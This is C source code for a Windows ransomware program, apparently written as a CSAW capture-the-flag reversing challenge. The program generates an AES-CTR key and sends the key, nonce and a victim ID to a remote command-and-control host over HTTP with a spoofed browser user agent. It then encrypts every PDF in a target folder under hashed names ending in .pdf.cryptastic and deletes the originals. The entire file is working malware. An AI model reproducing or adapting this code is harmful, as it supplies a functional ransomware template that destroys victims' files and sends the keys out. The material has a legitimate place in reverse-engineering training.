// Credit to Amit Kulkarni for OpenSSL EVP file encryption example
// https://github.com/kulkarniamit/openssl-evp-demo/blob/master/openssl_evp_demo.c

#include <stdio.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <string.h>
#include <windows.h>
#include <winbase.h>
#include <openssl/rand.h>
#include <Lmcons.h>
#include <shlwapi.h>
#include <winhttp.h>

#define AES_KEY_SIZE 16
#define IV_SIZE 16
#define ID_SIZE 8
#define BUFSIZE 1024 //increase this?

const WCHAR ccHost[] = L"rev.chal.csaw.io";
const DWORD ccServerPort = 8129;


struct materials {
    unsigned char* key;
    unsigned char* iv;
    const EVP_CIPHER *cipher_type;
    unsigned char* customer_id;
};

typedef struct materials Struct;


// Generate Key
Struct * ginerateKeyToHoldFilesForRandom(){

    Struct *mats = (Struct *)malloc(sizeof(Struct));

    if (!mats) {
        /* Unable to allocate memory on heap*/
        //fprintf(stderr, "ERROR: malloc error: %s\n", strerror(errno));
        exit(1);
    }
    mats->key = malloc(AES_KEY_SIZE);
    mats->iv = malloc(IV_SIZE);
    mats->customer_id = malloc(ID_SIZE);

    if (!RAND_bytes(mats->key, AES_KEY_SIZE) || !RAND_bytes(mats->iv, AES_KEY_SIZE) || !RAND_bytes(mats->customer_id, ID_SIZE)) {
        /* OpenSSL reports a failure, act accordingly */
        //fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        free(mats->key);
        free(mats->iv);
        free(mats->customer_id);
        free(mats);
        exit(1);
    };

    mats->cipher_type = EVP_aes_128_ctr();
    return mats;
};

DWORD get_sha256_sum(BYTE * hash, wchar_t * filename){
    HANDLE hFile = NULL;
    DWORD dwStatus = 0;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BOOL bResult = FALSE;
    BYTE fileBuffer[BUFSIZE];
    DWORD cbRead = 0;
    DWORD cbHash = 0;
    CHAR hashDigits[] = "0123456789abcdef";

    
    //CALG_SHA_256
    hFile = CreateFileW(filename,
                        GENERIC_READ | GENERIC_WRITE,
                        0,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        /* Unable to open file for reading */
        dwStatus = GetLastError();
        //fprintf(stderr, "ERROR opening file: %d\n", dwStatus);
        return dwStatus;
    };

    // Get handle to the crypto provider
    if (!CryptAcquireContextW(&hProv,
        NULL,
        NULL,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT)){
            dwStatus = GetLastError();
            //printf("CryptAcquireContext failed: %d\n", dwStatus);
            CloseHandle(hFile);
            return dwStatus;
    }

    if(!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        dwStatus = GetLastError();
        //printf("CryptCreateHash failed: %d\n", dwStatus);
        CloseHandle(hFile);
        CryptReleaseContext(hProv, 0);
        return dwStatus;
    }    

    while (bResult = ReadFile(hFile, fileBuffer, BUFSIZE, &cbRead, NULL)){
        if (0 == cbRead)
        {
            break;
        }
        if (!CryptHashData(hHash, fileBuffer, cbRead, 0))
        {
            dwStatus = GetLastError();
            //printf("CryptHashData failed: %d\n", dwStatus);
            CryptReleaseContext(hProv, 0);
            CryptDestroyHash(hHash);
            CloseHandle(hFile);
            return dwStatus;
        }
    }

    if (!bResult){
        dwStatus = GetLastError();
        //printf("ReadFile failed: %d\n", dwStatus);
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CloseHandle(hFile);
        return dwStatus;
    }

    cbHash = SHA256_DIGEST_LENGTH;
    if(!CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0)){
        dwStatus = GetLastError();
        printf("CryptGetHashParam failed: %d\n", dwStatus);
        return dwStatus;
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    CloseHandle(hFile);

    return dwStatus;
}

void dontFurget2StripThisBinaryLatter(){
    return;
}


// AES-CTR
int inkripshun(wchar_t* basePath, WCHAR * infilename, Struct *mats){

    // 1. Get hash of file
    // 2. Create new filename with sha256 hash of file
    // 3. Encrypt the file, save in new filename
    // 4. Delete the old file
    BYTE sha256Hash[SHA256_DIGEST_LENGTH];
    WCHAR hashDigits[] = L"0123456789abcdef";
    DWORD dwStatus = 0;
    WCHAR outfileSuffix[] = L".pdf.cryptastic";
    BOOL fSuccess = TRUE;

    // Hash contents
    dwStatus =  get_sha256_sum(sha256Hash, infilename);
    if (dwStatus !=0){
        //printf("Something went wrong with the SHA256 hash.\n");
        return -1;
    }

    // 2. Create new filename with sha256 hash of file
    DWORD outfileNameLength = wcslen(basePath) + SHA256_DIGEST_LENGTH*2 + wcslen(outfileSuffix) + 1;
    if (outfileNameLength > MAX_PATH){
        //wprintf(L"Error: Output filename too long. Not encrypting. basePath = %s", basePath);
        return -1;
    }
    wchar_t* outfileName = malloc(outfileNameLength*2);
    wcsncpy_s(outfileName, outfileNameLength, basePath, wcslen(basePath));
    DWORD i = 0;
    for (DWORD i = 0; i < SHA256_DIGEST_LENGTH; i++){
        wcsncat(outfileName, (WCHAR *) &hashDigits[sha256Hash[i] >> 4], 1);
        wcsncat(outfileName, (WCHAR *) &hashDigits[sha256Hash[i] & 0xf], 1);
    }

    wcsncat_s(outfileName,outfileNameLength, outfileSuffix, wcslen(outfileSuffix) + 1);

    // 3. Encrypt the file, save in new filename
    FILE *infile;
    HANDLE outfile = NULL;
  
    infile = _wfopen(infilename, L"rb");
    if (!infile) {
        /* Unable to open file for reading */
        //fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        free(outfileName);
        return errno;
    };
    outfile = _wfopen(outfileName, L"wb");
    if (!outfile) {
        // Unable to open file for writing
        //fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        free(outfileName);
        fclose(infile);
        return errno;
    }

    // Allow enough space in output buffer for additional block
    int cipher_block_size = EVP_CIPHER_block_size(mats->cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];

    int num_bytes_read, out_len;
    EVP_CIPHER_CTX *ctx;

    ctx = EVP_CIPHER_CTX_new();
    if(ctx == NULL){
        //fprintf(stderr, "ERROR: EVP_CIPHER_CTX_new failed. OpenSSL error: %s\n", 
        //        ERR_error_string(ERR_get_error(), NULL));
        free(outfileName);
        fclose(infile);
        fclose(outfile);
        return errno;
    };

    // Don't set key or IV right away; we want to check lengths
    if(!EVP_CipherInit_ex(ctx, mats->cipher_type, NULL, NULL, NULL, 1)){
        //fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", 
        //        ERR_error_string(ERR_get_error(), NULL));
        free(outfileName);
        fclose(infile);
        fclose(outfile);
        return errno;
    };

    OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == AES_KEY_SIZE);
    OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == AES_KEY_SIZE);

    // Now we can set key and IV 
    if(!EVP_CipherInit_ex(ctx, NULL, NULL, mats->key, mats->iv, 1)){
        //fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", 
        //  ERR_error_string(ERR_get_error(), NULL));
        EVP_CIPHER_CTX_cleanup(ctx);
        free(outfileName);
        fclose(infile);
        fclose(outfile);
        return errno;
    };

    while(1){
        // Read in data in blocks of size BUFSIZE until EOF. Update the cipher with each read.
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, infile);
        if (ferror(infile)){
            //fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
            EVP_CIPHER_CTX_cleanup(ctx);
            free(outfileName);
            fclose(infile);
            fclose(outfile);
            return errno;
        }
        if(!EVP_CipherUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
            //fprintf(stderr, "ERROR: EVP_CipherUpdate failed. OpenSSL error: %s\n", 
            //        ERR_error_string(ERR_get_error(), NULL));
            EVP_CIPHER_CTX_cleanup(ctx);
            free(outfileName);
            fclose(infile);
            fclose(outfile);
            return errno;
        }
        fwrite(out_buf, sizeof(unsigned char), out_len, outfile);
        if (ferror(outfile)) {
            //fprintf(stderr, "ERROR: fwrite error: %s\n", strerror(errno));
            EVP_CIPHER_CTX_cleanup(ctx);
            free(outfileName);
            fclose(infile);
            fclose(outfile);
            return errno;
        }
        if (num_bytes_read < BUFSIZE) {
            // Reached End of file 
            break;
        };
    } 
    // Now cipher the final block and write it out to file
    if(!EVP_CipherFinal_ex(ctx, out_buf, &out_len)){
        //fprintf(stderr, "ERROR: EVP_CipherFinal_ex failed. OpenSSL error: %s\n", 
        //        ERR_error_string(ERR_get_error(), NULL));
        EVP_CIPHER_CTX_cleanup(ctx);
        free(outfileName);
        fclose(infile);
        fclose(outfile);
        return errno;
    }
    fwrite(out_buf, sizeof(unsigned char), out_len, outfile);
    if (ferror(outfile)) {
        //fprintf(stderr, "ERROR: fwrite error: %s\n", strerror(errno));
        EVP_CIPHER_CTX_cleanup(ctx);
        free(outfileName);
        fclose(infile);
        fclose(outfile);
        return errno;
    };
    EVP_CIPHER_CTX_cleanup(ctx);

    // Delete original file?  Close infile and outfile
    fclose(infile);
    fclose(outfile);

    // 4. Delete the unencrypted file
    fSuccess = DeleteFileW(infilename);
    if(!fSuccess)
    {
        //wprintf(L"DeleteFile failed (%d)\n",GetLastError());
        free(outfileName);
        return GetLastError();
    }
    
    free(outfileName);
    return 0;
};


int sendKey(Struct * credentials){

    // CONNECT TO SERVER TO DOWNLOAD FILE
    HINTERNET hsession = NULL;
    HINTERNET hconnect = NULL;
    HINTERNET hrequest = NULL;
    DWORD payload_size = 97;

    // open http session
    LPCWSTR agent = L"Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko / 20100101 Firefox / 89.0";
    hsession = WinHttpOpen(agent,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    // report any errors
    if (!hsession) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // connect to http server 
    hconnect = WinHttpConnect(hsession, ccHost, ccServerPort, 0);
    WCHAR hashDigits[] = L"0123456789abcdef";

    // report any errors
    if (!hconnect) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
	}
	
    // open request to provided path
    wchar_t key_payload[payload_size];// = new wchar_t[34];
    wcsncpy_s(key_payload, payload_size, L"/key=", 6);
    for (DWORD i = 0; i < AES_KEY_SIZE; i++){
        wcsncat_s(key_payload, payload_size, (WCHAR *) &hashDigits[credentials->key[i] >> 4], 1);
        wcsncat_s(key_payload, payload_size, (WCHAR *) &hashDigits[credentials->key[i] & 0xf], 1);
    }
    wcsncat_s(key_payload,payload_size, L"&nonce=",8);
    for (DWORD i = 0; i < IV_SIZE; i++){
        wcsncat_s(key_payload, payload_size, (WCHAR *) &hashDigits[credentials->iv[i] >> 4], 1);
        wcsncat_s(key_payload, payload_size, (WCHAR *) &hashDigits[credentials->iv[i] & 0xf], 1);
    }
    wcsncat_s(key_payload,payload_size, L"&id=",5);
    for (DWORD i = 0; i < ID_SIZE; i++){
        wcsncat_s(key_payload, payload_size, (WCHAR *) &hashDigits[credentials->customer_id[i] >> 4], 1);
        wcsncat_s(key_payload, payload_size, (WCHAR *) &hashDigits[credentials->customer_id[i] & 0xf], 1);
    }
    //wprintf(L"Key payload: %s\n", key_payload);
    hrequest = WinHttpOpenRequest(hconnect, L"GET", key_payload, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // report any errors
    if (!hrequest) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }

    // send request 
    BOOL results;
    results = WinHttpSendRequest(hrequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    // report any errors.
    if (!results) {
        printf("Error %d has occurred.\n", GetLastError());
        exit(1);
    }
    results = WinHttpReceiveResponse(hrequest, NULL);

    // report any errors.
    if (!results) {
	printf("Error %d has occurred.\n", GetLastError());
	exit(1);
    }

    // The status code should be 404.
    DWORD sc = 0;
    DWORD dwSize = sizeof(sc);
    WinHttpQueryHeaders(hrequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
	WINHTTP_HEADER_NAME_BY_INDEX, &sc,
	&dwSize, WINHTTP_NO_HEADER_INDEX);

    return 0;
}

int writeUserID(Struct * credentials){
    wchar_t* IDFileName = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy_s(IDFileName, MAX_PATH, _wgetenv(L"USERPROFILE"), (MAX_PATH -35));
    wcsncat_s(IDFileName, MAX_PATH, L"\\AppData\\Local\\Temp\\sys_procid.txt", 35); 
    HANDLE IDFile = NULL;
    WCHAR hashDigits[] = L"0123456789abcdef";

    IDFile = _wfopen(IDFileName, L"wb");
    if (!IDFile) {
        // Unable to open file for writing
        fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        free(IDFileName);
        return errno;
    }

    for(DWORD i = 0; i < ID_SIZE; i++){
        fwrite(&hashDigits[credentials->customer_id[i] >> 4], sizeof(WCHAR), 1, IDFile);
        fwrite(&hashDigits[credentials->customer_id[i] & 0xf], sizeof(WCHAR), 1, IDFile);     
    }
    fwrite(L"\0", sizeof(WCHAR), 1, IDFile);    
    
    if (ferror(IDFile)) {
        fprintf(stderr, "ERROR writing to ID File: fwrite error: %s\n", strerror(errno));
        fclose(IDFile);
        free(IDFileName);
        return -1;
    }
	
    fclose(IDFile);
    free(IDFileName); 
    return 0;
}

// Main
int main(){

    FILE *nextFile;

    Struct * key_iv = ginerateKeyToHoldFilesForRandom();

    DWORD encryptionErrorCode;

    // Check CWD name
    wchar_t *directoryPath = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy_s(directoryPath, MAX_PATH, _wgetenv(L"USERPROFILE"), (MAX_PATH - 28));
    wcsncat(directoryPath, L"\\SecretCSAWDocuments\\", 22);  

    wchar_t *directoryDupe = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy_s(directoryDupe, MAX_PATH, directoryPath, MAX_PATH);
    
    wchar_t *basePath = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy_s(basePath, MAX_PATH, directoryPath, MAX_PATH);

    wchar_t *fileToEncryptPath = malloc(MAX_PATH*2);


    if (PathFileExistsW(directoryPath)) {

        // Write user ID to file
        writeUserID(key_iv);

        // Send key to server
        sendKey(key_iv);

        // Loop through files in directory
        WIN32_FIND_DATAW data;
        wcsncat(directoryPath, L"*.pdf", 6);
        HANDLE hFind = FindFirstFileW(directoryPath, &data);
        if( hFind != INVALID_HANDLE_VALUE){
            do{
                wcsncpy_s(fileToEncryptPath, MAX_PATH, directoryDupe, MAX_PATH);
                wcsncat(fileToEncryptPath, data.cFileName, (wcslen(data.cFileName)));
                encryptionErrorCode = inkripshun(basePath,fileToEncryptPath, key_iv);
                if(encryptionErrorCode!=0){
                    free(key_iv->customer_id);
                    free(key_iv->iv);
                    free(key_iv->key);
                    free(key_iv);
                    free(directoryPath);
                    free(basePath);
                    free(directoryDupe);
                    free(fileToEncryptPath);
                    exit(encryptionErrorCode);
                };
                memset(fileToEncryptPath, 0, MAX_PATH);
            } while (FindNextFileW(hFind, &data));
            FindClose(hFind);
        };

    }

    free(key_iv->customer_id);
    free(key_iv->iv);
    free(key_iv->key);
    free(key_iv);
    free(directoryPath);
    free(basePath);
    free(directoryDupe);
    free(fileToEncryptPath);
    dontFurget2StripThisBinaryLatter();
}
